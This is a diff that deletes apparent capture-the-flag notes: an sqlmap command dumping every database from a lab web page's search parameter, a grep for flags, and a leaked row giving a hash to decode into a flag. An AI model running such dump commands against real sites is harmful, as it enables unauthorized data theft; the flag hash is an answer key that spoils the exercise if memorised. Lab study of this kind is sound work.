@@ -1,9 +1,0 @@
-sqlmap -u "http://10.11.200.137/index.php?page=searchimg&id=2-1&Submit=Submit" --dump-all
-
-grep -r flag * 
-Member_images/list_images.csv:5,borntosec.ddns.net/images.png,Hack me ?,If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
-
-
-
-
-
